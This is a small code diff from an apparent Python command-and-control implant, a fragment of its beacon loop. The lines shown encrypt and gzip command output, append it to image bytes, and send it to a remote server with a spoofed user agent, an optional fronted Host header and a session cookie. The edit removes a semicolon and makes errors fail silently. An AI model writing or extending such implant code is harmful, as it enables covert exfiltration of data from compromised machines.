@@ -219,9 +219,8 @@ while(True):
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
             if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            res=urllib2.urlopen(req);
+            res=urllib2.urlopen(req)
             response = res.read()
 
       except Exception as e:
-        E = e
-        # print "error %%s" %% e
+        pass
